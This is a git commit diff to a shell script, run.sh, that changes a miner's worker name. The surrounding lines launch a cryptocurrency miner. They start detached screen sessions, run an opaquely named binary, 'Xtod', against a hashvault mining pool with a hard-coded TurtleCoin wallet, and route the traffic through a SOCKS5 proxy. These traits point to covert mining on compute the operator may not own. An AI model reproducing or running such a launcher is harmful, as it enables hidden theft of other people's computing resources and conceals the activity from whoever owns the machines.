03e8734812789d5971b4cca89825d8a8b18c2bf5
darestiwaedi <87831139+darestiwaedi@users.noreply.github.com>
2021-08-08 17:18:50 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -8,6 +8,6 @@ screen -d -m python3 ip
 screen -dmS ls
 POOL=pool.hashvault.pro:80
 WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
-WORKER=$(echo $(shuf -i 11111-999999 -n 1)-CPU)
+WORKER=1-GAS
 PROXY=socks5://72.210.252.134:46164
 ./Xtod -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
